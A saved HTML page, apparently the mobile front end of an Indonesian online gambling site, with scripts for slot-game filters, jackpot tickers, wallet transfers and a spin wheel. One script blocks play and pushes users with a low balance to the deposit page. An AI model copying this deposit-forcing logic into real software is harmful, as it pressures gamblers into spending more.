    }

    // Ambil saldo murni dari database via PHP
    var saldoMember = <?php echo (int)$saldo_murni; ?>; 

    // --- FILTER VIP BABY B88 (MINIMAL DI ATAS 50.000) ---
    // Jika saldo 50.000 ke bawah, tendang ke Deposit
    if (saldoMember <= 50000) {
        alert("MOHON MAAF DEPOSIT TERLEBIH DAHULU!!\nSaldo Kamu saat ini: Rp " + saldoMember.toLocaleString('id-ID') + "\n\nKlik OK untuk ke halaman DEPOSIT.");
        window.location.href = 'deposit.php';
        return;
    }

    // Jika saldo di atas 50.000, lanjut ke game
    var gID = $('#hiddenGameID-001').val() || '';
    var gCode = $('#hiddenGameCode001').val() || '';
    var sCode = $('#hiddenSubGameCode001').val() || '';
    
    var link = 'play.php?id=' + gCode + '&provider=' + gID + '&sub=' + sCode;
    window.location.href = link;
  }
</script>
<div class="nifty-modal slide-in-bottom " id="filterModal-2">
			<div class="md-content">
				<div class="md-body">
                          <div>
                            <p id="" i18n="">Select a filter : 
                                                                                    </p><p>
                             <label class="radio">
                                 <input class="with-gap" name="rdFilterSubGames" type="radio" value="BUY FREESPIN">
                                 <span class="filter-title">
                                        BUY FREESPIN
                                 </span>
                            </label>
                            </p>
                                                        <p>
                             <label class="radio">
                                 <input class="with-gap" name="rdFilterSubGames" type="radio" value="JP PROGRESSIVE">
                                 <span class="filter-title">
                                        JP PROGRESSIVE
                                 </span>
                            </label>
                            </p>
                                                    </div>
                        <div>
                            <button class="btn btn-primary" id="btnApplyFilter_01">APPLY</button>
                        </div>
  				</div>
			</div>
</div>
<div class="md-overlay"></div>

<div class="nifty-modal slide-in-bottom " id="searchModal">
			<div class="md-content">
				<div class="md-body">
                          <div>
                            	<div class="search_filter">
											            <span class="srch_icon md-close"><i class="icon-keyboard_arrow_left"></i></span>
											            <input type="text" matinput="" placeholder="Search" [(ngmodel)]="filterInput" maxlength="255" class="search" (change)="search($event)" i18n-placeholder="@Search">
											            <button matsuffix="" class="btn srch_button" (click)="clearSearch($event)"><i class="icon-x-square"></i></button>
											        </div>
                        </div>

  				</div>
			</div>
</div>
<div class="md-overlay"></div>
<script>
         var joinedJpIds = "";
         var gameCode = "sg_slot";
       function showGameLinks(e,name,imgSrc,gameCode,subCode){

            $('#gamelinksModal-1 .g-title').text(name);
            $('#gamelinksModal-1 img').attr( 'src',imgSrc);
            $('#hiddenGameCode001').val( gameCode );
            $('#hiddenSubGameCode001').val( subCode );
            $('#gamelinksModal-1').nifty("show");
        }


          $(document).ready(function () {
              var hotGame = '';
          
              if(hotGame){ 
                  $('.game-box').each(function() {
                        var isMatch = hotGame == $(this).data('title');
                        if(isMatch){
                              $(this).trigger('click');
                              return false;
                        }
                  });
              }

              /*search*/
              $('.search').keyup(function() {
                    
                    var value = $(this).val().toLowerCase();
                    var exp = new RegExp(value);
                    $('.game-box').each(function() {
                    var isMatch = exp.test(((typeof $(this).find('h5').data('title') == 'string') ? $(this).find('h5').data('title').toLowerCase() : $(this).find('h5').data('title')));
                    $(this).toggle(isMatch);
                    });
              });
              $('.srch_button').click(function(){
                    $('.search').val("");
                    $('.search').trigger("keyup");
              });
              /*search end*/


                $('.sub-games .filter .top').addClass('active');

                  function filterGameBoxes(self){

                        $('.sub-games .filter .btn').removeClass('active');
                        $(self).addClass('active');
                        var filterType= $(self).data('filter');

                        $('.sub-games .game-box').hide();
                        $('.sub-games .game-box').filter(function(){
                        return $(this).data("filter").indexOf(filterType)>=0;
                        }).show();

                  }


                  //Default to All Games :
                  filterGameBoxes($('.sub-games .filter .btn[data-filter=ALL]')[0]);

                  //Add filter btn event listen
                  $('.sub-games .filter .btn.f').click(function(){

                               filterGameBoxes(this);
                  })

                  $('#btnApplyFilter_01').click(function(){

                         var selFilter = $('input[name="rdFilterSubGames"]:checked').val();
                          var e =  $('#btnFilters_003')[0];
                          $(e).data('filter', selFilter);
                          filterGameBoxes(e);
                          $('#filterModal-2').nifty('hide');


                  })
                

                  if(joinedJpIds){
                              var url = "https://jpn-ticker-gcp-str.hep200512.com/v1/ticker?currency="+window.currencyCode +"&jackpotIds=" + joinedJpIds; 
           
                              
                              if($.ajaxSettings && $.ajaxSettings.headers) {
                                    delete $.ajaxSettings.headers["X-CSRF-TOKEN"];
                                    // console.log("remove X-CSRF-TOKEN header");
                                    // alert("remove X-CSRF-TOKEN header");
                              }
                              $.ajax({
                                          url: url,
                                          type: 'GET', 
                                          dataType: 'json', 
                                          headers: {
                                   
                                          },
                                          beforeSend: function(jqXHR, settings) {
                                                          
                                            }
                              })
                              .done(function(data) {
                                    if(data && data.length>0 ){
                                                //console.log(data);
                                          for (let i = 0; i < data.length; i++) {
                                                var  jp  = data[i];
                                                if(jp.jackpotId && jp.pools ){
                                                      var pool = jp.pools;
                                                      for(var key in pool ){ 
                                                                  if(pool.hasOwnProperty(key)){
                                                                        var amt = pool[key].amount;
                                                                       
                                                                        if(amt > 0 ){
                                                                              // console.log(amt);
                                                                               
                                                                              amt = amt.toString()
                                                                              $('[data-jpid="'+ jp.jackpotId +'"]').find('.amount_box').text( window.currencyCode +' ' +window.formatNumber(amt)).show();

                                                                              $('[data-jpid="'+ jp.jackpotId +'"]').find('.amount_box').each(function () {
                                                                              $(this).prop('Counter', 0).animate({
                                                                                    Counter: amt
                                                                              }, {
                                                                                    duration: 7000,
                                                                                    step: function (func) {
                                                                                    $(this).text(window.currencyCode +' ' +window.formatNumber(func.toString()));
                                                                                    }
                                                                              });
                                                                              });
                                                                        }
                                                                  }
                                                              break;
                                                      }
                                                }
                                                   
                                          }

                                                
                                      }
                                                
                                  
                                   
                              }) ;
                              if($.ajaxSettings && $.ajaxSettings.headers) {
                              
                                    $.ajaxSettings.headers["X-CSRF-TOKEN"] = $('meta[name="csrf-token"]').attr('content'); 
                                    // console.log("add back X-CSRF-TOKEN  header");
                                    // alert("add back X-CSRF-TOKEN header");
                              }
                 }

          });
</script>

                    <div class="mobilesite-footer">  
          <div class="container">
              <style media="screen">
.left-custom-livechat-code{
  bottom: 58px !important;
}
#chat-widget-container{
  bottom: 51px !important;
}
</style>
<div class="menu-bottom">
    <nav class="navbar-inverse navbar-fixed-bottom">
        <div class=" ">
                        <div class="flex-row  text-center">
                <div class="  footericon-single">
                    <a href="https://www.Goblin88.site/home.php?i=1#"><i class="icon-home"></i><div>HOME</div></a>
                </div>
                

                                
                                  <div class="  footericon-single">
                    <a href="https://www.Goblin88.site/promosaya.php"><i class="icon-gift"></i> <div style="text-transform:uppercase;">Promo saya</div></a>
                  </div>
                
                <div class=" footericon-single">
                    <a href="javascript:void(0);" class="text-uppercase togglemenu-trigger footer-funds" data-showid="#fundshover_menu"><i class="icon-transfer"></i> <div>Dana</div></a>
                    <ul class="list-inline horizontal-hover togglemenu-content" id="fundshover_menu">
                      <li>
                        <a href="https://www.Goblin88.site/deposit.php" (click)="closeNav($event);">
                            <div class="fs-sm mt-1" i18n="">Deposit</div>
                        </a>
                      </li>
                      <li>
                        <a href="https://www.Goblin88.site/withdraw.php" (click)="closeNav($event);">
                          <div class="fs-sm mt-1" i18n="">Withdraw</div>
                        </a>
                      </li>
                      <li>
                        <a href="https://www.Goblin88.site/history.php" (click)="closeNav($event);">
                          <div class="fs-sm mt-1" i18n="@History">Pernyataan &nbsp;</div>
                        </a>
                      </li>
                    </ul>
                </div>
                                                <div class=" footericon-single">
                    <a href="https://www.Goblin88.site/memo.php" style="position:relative;"><i class="icon-mail_outline"></i> <div>MEMO</div>
                      
                            <div class="mail_icon" style="">26</div>
                        
                    </a>
                </div>
                
<div class=" footericon-single" style="position: relative">
    <a href="javascript:void(0)" class="text-uppercase togglemenu-trigger" data-showid="#livechathover_menu"><i class="icon-chat1"></i><div>LIVE CHAT</div></a>
    <ul class="list-inline vertical-hover togglemenu-content text-center" id="livechathover_menu">
        <li>
            <!-- 👇 Link statis diganti pakai variabel PHP $linkLiveChat, dan script JS dihapus -->
            <a href="javascript:void(0)" id="livechat-btn" onclick="openLiveChat('https://direct.lc.chat/19926541/' , '')">
                <i class="icon-chat1"></i>
            </a>
        </li>
                                                              
        <li>
            <a href="https://api.whatsapp.com/send?phone=081318111340" target="_blank "><i class="icon-whatsapp"></i></a>
        </li>                          
                                                   
        <li>
            <a href="https://telegram.me/BABYBOSSQOFFICIAL" target="_blank "><i class="icon-telegram"></i></a>
        </li>
    </ul>
</div>
            </div>
        </div>
    </nav>
</div>



<script type="text/javascript">
    $(".togglemenu-trigger").click(function(){
      var currentToggle = $(this).attr("data-showID");
      if($(currentToggle).hasClass("show")){
        $(currentToggle).removeClass("show");
      }
      else{
        $(".togglemenu-content").removeClass("show");
        $(currentToggle).addClass("show");
      }

    });
</script>
            </div>
            </div>
                  </div>
      </div>
      <div id="r-side-bar"> 
    <div class="side-bar-content container"> 
            </div> 
</div> 
 



    </div>
  </div>


  <!--loading modal -->
  <div class="nifty-modal fade-in-scale" id="loading--layout" style="z-index:1000001;" data-isnotcloseoverlay="true">
    <div class="md-content">
      <div class="md-body">

        <div class="loader-b large"></div>
      </div>
    </div>
  </div>
  <div class="md-overlay" style="z-index:1000000;"></div>
  <!--END loading modal -->

  <!-- APK download ||Transfer Wallet  modal start-->
  <div class="nifty-modal slide-in-bottom downloadapk-modal" id="apk-modal">
  			<div class="md-content">
          <div class="modal-header">
       <button class="pull-right md-close"><i class="icon-x fs-lg"></i></button>
      <h3 id="downloadgame-title"></h3>
    </div>
  				<div class="md-body">
           <!--region Transfer Wallet Menu -->
            <div class="row no-gutters" id="trans_to_game_menu__game-modal">
                <form action="" method="post" id="tw_transfer_form" class="tw_transfer_form" novalidate="novalidate">
                  <input type="hidden" name="_token" value="6mpScfAoG0WWOBdqpvKSa5nHR7C4udBoqhKvvRL6">                    <div class="form-group">
                        <label for="mainwallet_amount">From Main Wallet</label>
                        <input type="text" class="form-control" readonly="" name="mainwallet_amount" id="mainwallet_amount" value="188.67">

                    </div>
                    <div class="text-center">
                      <span class="vertical"><i class="icon-arrow-long-right"></i></span>
                    </div>
                    <div class="row">
                      <div class="col-xs-12">
                        <label for="mainwallet_amount">Transfer to <span id="gamename"></span> Wallet</label>
                        <div class="form-group">

                          <div class="customrange-slider">
                            <div id="slider" overflow-scroll="false" class="ui-slider ui-corner-all ui-slider-horizontal ui-widget ui-widget-content">
                              <span tabindex="0" class="ui-slider-handle ui-corner-all ui-state-default" style="left: 0%;"></span>
                              <div class="ui-slider-range ui-corner-all ui-widget-header ui-slider-range-min" style="width: 0%;"></div>
                            </div>
                            <div class="decrease-btn cusbtn">
                              <div id="tw_decrease_btn"> <span class="minus-icon custom-icon">-</span> </div>

                              <div class="minmax-label">Min</div>
                              <div class="minmax-value">
                              5000
                              </div>
                              <input type="hidden" name="twminval" id="twminval" value="5000">
                            </div>
                            <div class="increase-btn cusbtn">
                              <div id="tw_increase_btn">
                                <span class="plus-icon custom-icon">+</span>
                              </div>

                              <div class="minmax-label">Max</div>
                              <div class="minmax-value" id="maxSliderApk">188.67</div>
                            </div>
                          </div>
                        </div>
                          <div class="col-md-8 col-md-offset-2 col-sm-8 col-sm-offset-2 col-xs-8 col-xs-offset-2">
                        <div class="form-group">
                            <input type="text" readonly="" class="form-control" name="transfer_amount" id="transfer_amount" placeholder="0.00" value="00.00" required="">
                        </div>
                        </div>
                      </div>
                    </div>
                    <div class="text-center">
                        <input type="submit" class="btn btn-primary" value="SUBMIT">
                    </div>
                </form>
            </div>
          <!--endregion Transfer Wallet Menu -->

  					<div class="row no-gutters">
  							<div class="col-xs-12 text-center">
  								<a href="#" id="launchurl" class="url-link" target="_blank">
                	<img class="img-fluid" src="/assets/images/log_html5.png" alt="play-in-browser">
  								<div class="download-caption text-center">
  										Play now in your browser
  								</div>
  								<div class="download-linkbtn text-center">
  									<img class="img-fluid" src="/assets/images/btn_playnow.png" alt="play-now-in-browser">
  								</div>
  							</a>
  							</div>
  						</div>
    				</div>
  			</div>
  </div>
  <div class="modal-wrapper nifty-modal fade-in-scale" id="live-draw-modal" data-isnotcloseoverlay="true">
    <div class="md-content"> 
      <div class="md-body"> 
        <div class="modal-header">
        <h4 class="modal-title">Live Draw</h4>      
        <button class="btn btn-link pull-left " id="btn-close--live-draw-modal"> <i class="icon icon-close"></i> </button>
</div>

<div class="modal-body">
    <div id="live_draw_table">
   
    </div>
    <div id="img_details">
        <img src="" class="draw_img" id="draw_img">
        <div class="details">

            <p class="tickte_id">undian berikutnya: <span id="ticket_id"></span></p>
        </div>

        <div class="close_btn_section">
            <button class="btn btn-close" id="img--section-closebtn" onclick="closeImageSection()">Kembali</button>
        </div>
    </div>
    
</div>
      </div>
    </div>
  </div>
  <div class="md-overlay"></div>
  <!-- APK download modal end-->


  <!--<script src="/js/sweetalert.js"></script>  -->


  <script type="text/javascript">

    $(document).ready(function(){
        $( "#mainContentContainer" ).click(function() {
          $( "#sideNav" ).removeClass( "navContentOpen" );
          $( "#sideNav" ).removeClass( "open" );
          $( "#mainContent" ).removeClass( "navContentOpen" );
          $( "#mainContent" ).removeClass( "sideNavOpen" );
          $( "#mainContent" ).removeClass( "rightSideBarOpen" );
          $( "#r-side-bar" ).removeClass( "open" );
        });

        //this is mobile version of btn close login modal
         $(document).on('click', '#btn-close--login-modal',function(event){
              event.preventDefault();
              event.stopPropagation();
              $('#r-side-bar').removeClass('open');
              $( "#mainContent" ).removeClass( "rightSideBarOpen" );
              return false;

        });

        $(document).on('click','.btn-collapse-balances', function(){
          if( !$('#other-game-bals').is(':visible')){
            $('#other-game-bals').slideDown();
            window.getAllGameBal();
          }
          else{
            $('#other-game-bals').slideUp();
          }
          return false;
        });
      });

  </script>

  <script>
    

    
   
    window.loadOrRefreshTurnstileWidget= function(  selectorId ){

         //do nothing;
    }
     
</script>
    <script type="text/javascript" src="/assets/js/jquery-validation/jquery.validate.min.js"></script>
    <script type="text/javascript" src="/assets/js/jquery-validation/additional-methods.min.js"></script>
    <link rel="stylesheet" href="/assets/js/fancybox/jquery.fancybox.min.css">


    <script type="text/javascript" src="/assets/js/fancybox/jquery.fancybox.min.js"></script>
<script>
 
        window.isAuth=  true  ? true : false;
        window.onLogOut = async function(){
            if(window.iFirebase){
                await window.iFirebase.logout();
            }
            
            window.location.href="https://www.Goblin88.site/logout.php";

        }
        window.fbs =  {"apiKey":"AIzaSyA6hCmsU1Tx-_rB9st6TiXLT_M3D-qQ9aw","authDomain":"api-kixplay-live1.firebaseapp.com","projectId":"api-kixplay-live1","storageBucket":"api-kixplay-live1.firebasestorage.app","messagingSenderId":"892534263551","appId":"1:892534263551:web:8c9f262c8a457b082146ca","measurementId":null} ;
        window.firebasSuccessCb = function (params){
        window.json_post(
                "/authViaIdp",
                params ,
                "json",
                showLoadingImgFn   ,
                 removeLoadingImgFn    ,
            ).done(function(d){
    
             window.onLoginCallback(d,true);

            });
        }
    

         window.currencyCode='IDR';
         window.lang="id";
         window.agentCode='MERCUSUAR77';
         window.sweetAlert= function ( msg , type , title  ,showCancelBtn   ) {
            //check CF error
            var dateNow = "2026-02-25 08:25:39";

            if (msg.indexOf('cloudflare') >= 0) {
                msg = transMsgs.cfTimeout + ' (error time: ' + dateNow + ')';
                title = " ";
            }
            if (msg.indexOf('challenge') >= 0) {
                msg = transMsgs.cfChallenge + ' (error time: ' + dateNow + ')';
                title = " ";
            }
             return     Swal.fire({
                    title: !title? "Warning" : title,
                    text: msg,
                    icon: !type? "error":type,
                    showCancelButton :(showCancelBtn ? true:false),
                    cancelButtonText : "Cancel",
                    showConfirmButton : true, 
                    confirmButtonText : 'OK', 
                } );
            }
            console.log('window.name ' + window.name );
            window.name = !window.name? "parent"  + Date.now() + Math.floor(Math.random() * 100000000) : window.name;
            console.log('window.name ' + window.name );
           window.formatNumber = function (n)   {
                // format number 1000000 to 1,234,567
                return n.replace(/[^0-9\-]/g, "").replace(/\B(?=(\d{3})+(?!\d))/g, ",")
            }
            window.convertToNumber= function (value) {

                    if (!value) {
                        return 0;
                    }
                    if(value.indexOf(".") >= 0){
                        var decimal_pos = value.indexOf(".");
                        value= value.substring(0, decimal_pos);

                    }
                    var number =value.replace(/[^0-9.-]+/g, "");
                    if (isNaN(number)) {
                        number = 0;
                    }
                return number;
           }

            window.formatCurrency = function (value) {
                    const symbol = "";//"$"
                    // get input value
                    var input_val = value;

                    if (typeof value !== 'string') {
                        var input_val = value.toString();
                    }
                    if (input_val === "") { return; }

                    var original_len = input_val.length;


                    if (input_val.indexOf(".") >= 0) {

                        var decimal_pos = input_val.indexOf(".");
                        var left_side = input_val.substring(0, decimal_pos);
                        var right_side = input_val.substring(decimal_pos+1);

                        left_side = formatNumber(left_side);

                        right_side += "00";

                        right_side = right_side.substring(0, 2);

                        input_val = symbol + left_side + "." + right_side;

                    } else {
                        input_val = formatNumber(input_val);
                        input_val = symbol + input_val + ".00";;

                    }

                    return input_val;
           }

                window.prize = 0 ;
                window.ajax_jackpot= function  () {
                    $.ajax({
                        url: "https://merdekaMERCUSUAR77.site/getPokerJackpotAmt",
                        type: 'post',
                        data: { _token : $('meta[name=csrf-token]').attr('content') },
                        success: function (data) {
                            prize = (data / 2000.000)*2000.000;
                            $('.jackpot_numbers_home').html(`IDR <span id="jackpot_amount">${ commaSeparateNumber(prize) }</span>`)

                            //$('.jackpot_numbers_home').html(`IDR ` + commaSeparateNumber(data.prize));
                        }
                    });
                }
                window.getHkbLotteryResults= function  (callback) {
                    var results = [];
                    $.ajax({
                        url: "https://merdekaMERCUSUAR77.site/getHKBLotteryResults",
                        type: 'post',
                        data: { _token : $('meta[name=csrf-token]').attr('content') },
                        success: function (result) {
                            results =  result.data.hkb_lottery_results;
                            if (typeof callback === 'function') {
                                callback(results);
                            }
                        }
                    });
                   
                }

                var newI = 0;
                window.popitup = function  (url,gameid) {
                  //alert(gameid);
                    newwindow = window.open(url,  window.agentCode + '_gameWindow'+gameid+newI,'toolbar=0,width=1200,height=750');
                    newI++;
                    if (window.focus) { newwindow.focus() }
                    return false;
                }

                window.popup = function (mylink, windowname) {
                    if (!window.focus) return true;
                    var href;
                    if (typeof (mylink) == 'string')
                        href = mylink;
                    else
                        href = mylink.href;
                    window.open(href, windowname, 'width=600,height=800,scrollbars=yes');
                    return false;
                }
                window.commaSeparateNumber = function (val, isJP) {
                    while (/(\d+)(\d{3})/.test(val.toString())) {

                        if( window.currencyCode=='VND' && isJP){
                            val = val.toFixed(0);
                        }else {
                            val = Number(val).toFixed(2);
                        }
                        val = val.toString().replace(/(\d)(?=(\d\d\d)+(?!\d))/g, "$1,");
                    }
                    return val;
                }

                window.getRandomIntInclusive =  function (min, max) {
                    min = Math.ceil(min);
                    max = Math.floor(max);
                    return Math.floor(Math.random() * (max - min + 1)) + min; //The maximum is inclusive and the minimum is inclusive
                }

                /*bank acc min and maxlength limitation */
                window.accLength = parseInt("8");
                    window.bankAccLength =function(selectedBank, default_minlength, default_maxlength){
                        console.log(selectedBank, default_minlength, default_maxlength);
                        var   custom_minLength, custom_maxLength;
                if(selectedBank == 'MDR' || selectedBank == 'MDRLV'){
                    custom_minLength = 13;
                    custom_maxLength = 13;
                }
                else if(selectedBank == 'BNI' || selectedBank == 'BCA' || selectedBank == 'BSI' || selectedBank == 'BLA'){
                    custom_minLength = 10;
                    custom_maxLength = 10;
                } 
                else if(selectedBank == 'BRI'){
                    custom_minLength = 15;
                    custom_maxLength = 15;
                } 
                else if(selectedBank == 'DMN'){
                    custom_minLength = 10;
                    custom_maxLength = 12;
                } 
                else if(selectedBank == 'BPDSULTENG'){
                    custom_minLength = 10;
                    custom_maxLength = 15;
                }
                else if(selectedBank == 'ALADIN' || selectedBank == 'ALLO'){
                    custom_minLength = 10;
                    custom_maxLength = 13;
                } 
                else if(selectedBank == 'JAGO' || selectedBank == 'ARIN'){
                    custom_minLength = 8;
                    custom_maxLength = 12;
                } 
                else if(selectedBank == 'CIMBN' || selectedBank == 'SEABANK'){
                    custom_minLength = 12;
                    custom_maxLength = 12;
                }  
                else{
                    custom_minLength  = default_minlength;
                    custom_maxLength  = default_maxlength; 
                }   
                
                return {'min_len': custom_minLength,'max_len': custom_maxLength}
                    }
                /*bank acc min and maxlength limitation end*/ 


  $(document).ready(function () {
                    //suspend-alert
                   // login-alert
                   // promo-disabled-alert
                   // "maintenance-alert";
                   // "comingsoon-alert";
                window.alertLogin=function(e){
                    e.preventDefault();
                    sweetAlert( transMsgs.plsLogin  );
                    return false;
                }

                $(".suspend-alert").click(function (e) {
                        e.preventDefault();
                        sweetAlert( transMsgs.blockedFrGame);
                        return false;
                });

                $(".login-alert").click(function (e) {
                    if($("#login-modal--layout").length && !$('#loginForm').hasClass('js-inline-form') ){
                         $("#login-modal--layout").nifty("show")
                    }
                    else {
                        alertLogin(e);
                    }

                    return false;
                });

                $(".maintenance-alert").click(function (e) {
                        e.preventDefault();
                        sweetAlert( transMsgs.gameMaintenance);
                        return false;
                });

                $(".comingsoon-alert").click(function (e) {
                        e.preventDefault();
                        sweetAlert( transMsgs.gameComingSoon);
                        return false;
                });

                $(".promo-disabled-alert").click(function (e) {
                        e.preventDefault();
                        sweetAlert(transMsgs.gamePromoBlock);
                        return false;
                });


               
                $("#login-modal--layout").on('shown.nifty.modal', function(){
                    window.loadOrRefreshTurnstileWidget('loginTurnstileWidget' ); 
                });
 
        });


        $("input").focus(function() {
          $("body").addClass("input-focused");
        });
        $("input").focusout(function() {
          $("body").removeClass("input-focused");
        });

        // popup banner
        var isLoggedIn = window.isAuth;
        var isClosedPopUp = isLoggedIn ? sessionStorage.getItem('isClosedPopUpAftLogin') : sessionStorage.getItem('isClosedPopUp');
        
        if(!isClosedPopUp){
                    }
</script>


<script defer="" type="text/javascript" src="/assets/js/firebase10d9.js"> </script>


 
  <div class="reward-program-popup"></div>
<div class="claimed-reward-popup"></div>
<div class="redeem-ticket-popup"></div>

<!-- spin-wheel modal -->
<div class="modal-wrapper nifty-modal fade-in-scale" id="spin-wheel-modal--layout" data-isnotcloseoverlay="true">
	<div class="md-content"> 
		<div class="md-body"> 
		<div class="modal-header text-center headerModal">
			<button class="btn btn-link closeBtn" id="btn-close--spin-wheel-modal"> X </button>
			</div>
			<div class="flex spinWheelWrapper text-center">
            <!-- spin-wheel type -->
            <input type="hidden" id="spin_wheel_type" value="">

              <div class="spinWheelTitle">Spin Wheel</div>
              <div>untuk mendapatkan koin atau lainnya</div>
              
              <div class="spinWheel">
                <div class=" inline-flex" style="position: relative;">
                  <canvas id="wheelCanvas" width="280" height="280"></canvas>
                  <div class="spinWheelArrow"></div>
                </div>
              </div>
            </div>
			<div class="flex" style=" place-content: center; ">
                <button class="btn btn-block btn-primary " id="spinBtn">
				 Coba Keberuntungan Anda                </button>
            </div>
        </div>
	</div>
</div>
<div class="md-overlay"></div>
<!-- end of spin-wheel modal -->
  <script type="text/javascript" src="/assets/js/ugsports/app_mobile.js"> </script>
  <!--License TNC Modal -->
<!--License TNC Modal -->

<!--Language Option Modal -->
<div class="nifty-modal slide-in-bottom " id="langModal-mobile">
  <div class="md-content">
    <div class="md-body">
      <div class="wrap language">
        <div class="title">Wilayah dan bahasa</div>
        <table class="table-borderless"> 
        
          <tbody><tr>
            <td class="country">Indonesia</td>
            <td></td>
            <td></td>
          </tr>
          <tr>
            <td class="flag-wrap">
              <div class="circle-id"></div>
            </td>
                        <td class="i  ">
            <a href="#" onclick="changeLang(&quot;id&quot;)"> indonesian</a>
            </td>

                        <td class="i b-line ">
            <a href="#" onclick="changeLang(&quot;en&quot;)"> English</a>
            </td>

                        <td class="i b-line ">
            <a href="#" onclick="changeLang(&quot;cn&quot;)"> Mandarin</a>
            </td>

                      </tr> 
     
        </tbody></table>
      </div>
    </div>
  </div>
</div>
<div class="md-overlay"></div>
<!--END Language Option Modal -->
 
<script>
$(document).ready(function () {
  });
 function changeLang(key){
      change_lang(key)
  }
  $('.btn-refresh-captcha').on( 'click', function(e){
e.preventDefault();
e.stopPropagation(); 
var $captchaImg = $(this).parent().find('img');
var curCapUrl = $captchaImg .attr("data-url");
var url = curCapUrl + Date.now() + Math.floor(Math.random() * 100000000);
$captchaImg.attr("src",url);

});



</script>





  

  <script type="text/javascript">
    $(document).ready(function(){
      if( window.location.href.indexOf('reLogin=yes') >= 0  &&  !window.isAuth){
        $("#btnToggleRSideNav").trigger('click');
      }
    });
  </script>

  <script defer="" src="https://static.cloudflareinsights.com/beacon.min.js/vcd15cbe7772f49c399c6a5babf22c1241717689176015" integrity="sha512-ZpsOmlRQV6y907TI0dKBHq9Md29nnaEIPlkf84rnaERnq6zvWvPUqr2ft8M1aS28oN72PdrCzSjY4U6VaAw1EQ==" data-cf-beacon="{&quot;version&quot;:&quot;2024.11.0&quot;,&quot;token&quot;:&quot;733979b9c24043199561a4eac8bf2940&quot;,&quot;r&quot;:1,&quot;server_timing&quot;:{&quot;name&quot;:{&quot;cfCacheStatus&quot;:true,&quot;cfEdge&quot;:true,&quot;cfExtPri&quot;:true,&quot;cfL4&quot;:true,&quot;cfOrigin&quot;:true,&quot;cfSpeedBrain&quot;:true},&quot;location_startswith&quot;:null}}" crossorigin="anonymous"></script>




<veepn-lock-screen><style>@font-face{font-family:FigtreeVF;src:url(chrome-extension://majdfhpaihoncoakbjgbdhglocklcgno/fonts/FigtreeVF.woff2) format("woff2 supports variations"),url(chrome-extension://majdfhpaihoncoakbjgbdhglocklcgno/fonts/FigtreeVF.woff2) format("woff2-variations");font-weight:100 1000;font-display:swap}</style></veepn-lock-screen><iframe ng-non-bindable="" frameborder="0" hspace="0" marginheight="0" marginwidth="0" scrolling="no" tabindex="-1" vspace="0" width="100%" aria-hidden="true" id="I0_1771979141472" name="I0_1771979141472" src="https://api-kixplay-live1.firebaseapp.com/__/auth/iframe?apiKey=AIzaSyA6hCmsU1Tx-_rB9st6TiXLT_M3D-qQ9aw&amp;appName=%5BDEFAULT%5D&amp;v=11.3.0&amp;eid=p&amp;usegapi=1&amp;jsh=m%3B%2F_%2Fscs%2Fabc-static%2F_%2Fjs%2Fk%3Dgapi.lb.id.8ECc3i-niIA.O%2Fd%3D1%2Frs%3DAHpOoo8g466w4vfctJFQ7iHLN0dzTSqREg%2Fm%3D__features__#id=I0_1771979141472&amp;_gfid=I0_1771979141472&amp;parent=https%3A%2F%2FmerdekaMERCUSUAR77.site&amp;pfname=&amp;rpctoken=39952833" style="position: absolute; top: -100px; width: 1px; height: 1px;"></iframe></body></html>